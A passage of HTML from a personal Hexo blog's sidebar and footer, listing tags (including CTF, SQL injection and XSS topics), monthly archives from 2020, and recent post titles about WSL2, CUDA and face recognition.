class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/" rel="tag">人脸识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" rel="tag">深度学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%85%8D%E7%BD%AE/" rel="tag">配置</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/CUDA/" style="font-size: 10px;">CUDA</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/MiKTeX/" style="font-size: 10px;">MiKTeX</a> <a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/Q-A/" style="font-size: 10px;">Q&A</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/WSL/" style="font-size: 13.33px;">WSL</a> <a href="/tags/WSL2/" style="font-size: 10px;">WSL2</a> <a href="/tags/Windows/" style="font-size: 16.67px;">Windows</a> <a href="/tags/XSS%E6%94%BB%E5%87%BB/" style="font-size: 10px;">XSS攻击</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/face-recognition/" style="font-size: 10px;">face recognition</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/latex/" style="font-size: 10px;">latex</a> <a href="/tags/opencv/" style="font-size: 10px;">opencv</a> <a href="/tags/pycuda/" style="font-size: 10px;">pycuda</a> <a href="/tags/tips/" style="font-size: 10px;">tips</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/zeit/" style="font-size: 10px;">zeit</a> <a href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" style="font-size: 10px;">人工智能</a> <a href="/tags/%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/" style="font-size: 10px;">人脸识别</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 10px;">杂项</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">深度学习</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 13.33px;">笔记</a> <a href="/tags/%E9%85%8D%E7%BD%AE/" style="font-size: 20px;">配置</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/12/29/test/">test</a>
          </li>
        
          <li>
            <a href="/2020/12/29/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2020/12/29/WSL+CUDA/">Windows 下利用 WSL2 配置 CUDA和pyCUDA</a>
          </li>
        
          <li>
            <a href="/2020/12/28/WSL2%E5%AE%89%E8%A3%85/">Windows 使用 lxrunoffline 安装 WSL、WSL2</a>
          </li>
        
          <li>
            <a href="/2020/11/27/ubuntu_opencv_face_reconginition/">opcv + face_recognition 实现人脸实时识别</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2020 Ron<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>